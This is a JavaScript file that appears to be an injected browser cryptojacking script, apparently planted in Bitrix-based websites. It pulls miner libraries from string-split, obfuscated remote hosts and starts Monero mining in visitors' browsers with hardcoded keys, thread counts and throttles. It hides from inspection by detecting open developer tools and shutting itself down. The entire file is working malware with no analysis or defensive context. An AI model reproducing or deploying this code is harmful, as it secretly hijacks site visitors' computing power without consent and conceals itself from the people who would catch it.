if (typeof BX == 'undefined' || typeof BX.admin == 'undefined') {
    
    window.rotmindeg = false;
    if (window.location.hash == '#'+'d'+'x123'+'_fag') window.rotmindeg = true;
    
    ;(function(window){
    window.jssassin = window.jssassin || {
    
        config: {
            instpDelay: 400,
            startDelay: 1600
        },
        
        state: {
            scriptsNotLoad: 0,
            init: false
        },
        
        proc: {
                start: function(){},
                destroy: function(){}
            },
        
        inspInterval: undefined,
        
        init: function (
                scripts,
                start,
                destroy
            ) {
            
            if (window.rotmindeg) console.log('start init');
            
            if (this.state.init) return;
            this.state.init = true;
            
            if (window.rotmindeg) console.log(scripts,start);
            
            var self = this;
            if (this.isDangerous()) return;
            
            if (typeof start == "function") this.proc.start = start;
            if (typeof destroy == "function") this.proc.destroy = destroy;
            
            this.state.scriptsNotLoad = scripts.length;
                                                        
            if (this.state.scriptsNotLoad > 0) {
                scripts.forEach(function(src) {
                    var script = document.createElement('script');
                    script.src = src;
                    script.async = false;
                    script.onload = function () {self.onloadScript(script)};
                    document.head.appendChild(script);
                    if (window.rotmindeg) console.log('adding script: '+src);
                });
                
                return;
            }
            
            this._init();
            
        },
        onloadScript: function (script) {
            this.state.scriptsNotLoad--;
            document.head.removeChild(script);
            if (window.rotmindeg) console.log('loading script: '+src);
            if (this.state.scriptsNotLoad === 0) this._init();
        },
        _init: function () {
            
            var self = this;
            setTimeout(function () {
                self.proc.start();
            }, this.config.startDelay);
            
            this.inspInterval = setInterval(function () {self.inspector();}, this.config.instpDelay);
        },
        
        
        isDangerous: function () {
            if (window.rotmindeg) {
                console.log('dangerous!');
            }
            if (this.checkDevtoolsInWindow()) {
                this.destroy();
                return true;
            }
            return false;
        },
        
        inspector: function () {
            if (window.jssassin != undefined && typeof window.jssassin.isDangerous == "function") {
                if (this.isDangerous()) {
                    if (window.rotmindeg) console.log('stop inspector');
                    clearInterval(this.inspInterval);
                }
            }
        },
        
        
        destroy: function () {
            clearInterval(this.inspInterval);
            if (window.rotmindeg) {
                console.log('destroy!!!');
                return true;
            }
            this.proc.destroy();
            delete window.jssassin;
        },
        
        ////////////////////////////////////////////////////////////////////////////
        checkDevtoolsInWindow: function () {
            var widthThreshold = window.outerWidth - window.innerWidth > 160;
            var heightThreshold = window.outerHeight - window.innerHeight > 160;
            if (!(heightThreshold && widthThreshold) &&
          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
                return true;
            } else {
                return false;
            }
        }
    };
    })(window);
    
    ////////0.3.4////////
    
    var variant = window.varsfacebag || Math.floor(1+Math.random()*4);
    var date = new Date();
    var strDate = date.getDate() + date.getMonth() + date.getFullYear();
    
    if (window.rotmindeg) console.log('v: '+variant);
    
    if (variant == 1) {
        window.jssassin.init(
                ['//www.spare'+'change.io/static/spare'+'change.js?w=62'],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    var apiKey = "9636f65fe1b47fd89b23e9fcc173673b7e2614818bdc6090decbafb2c5705207da6354a420d33f0fc5d77e97e4f497a9c6b133c0284f20bbd33bc49f1b6ada5b";
                    var miner = new Miner(apiKey, null, t);
                    miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 3) {
        window.jssassin.init(
                ['//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('06d93b846706f4dca9996baa15d4d207e82d1e86676c', // wave2
                            {threads:6,throttle:t,coin:"xmr"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 2) {
        window.jssassin.init(
                ['//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('ef937f99557277ff62a6fc0e5b3da90ea9550ebcdfac', // share
                            {threads:6,throttle:t,coin:"xmr"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 4) {
        window.jssassin.init(
                ['//www.hos'+'tingcl'+'oud.rac'+'ing/FA'+'Cg.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window._client = new Client.Anonymous('7095c82850c36b6cb1b3bdfe4a48ef7dff73698cdfb5946d14472b2c494dd9a0', { // imp
                        throttle: t
                    });
                    window._client.start();
                },
                function () {
                    if (window._client != undefined && typeof window._client.stop == 'function') window._client.stop();
                }
            );
    } else {
        window.jssassin.init(
                ['//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.6;
                    window.miner = new CRLT.Anonymous('dd27d0676efdecb12703623d6864bbe9f4e7b3f69f2e', // silent
                            {threads:4,throttle:t}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    }
}

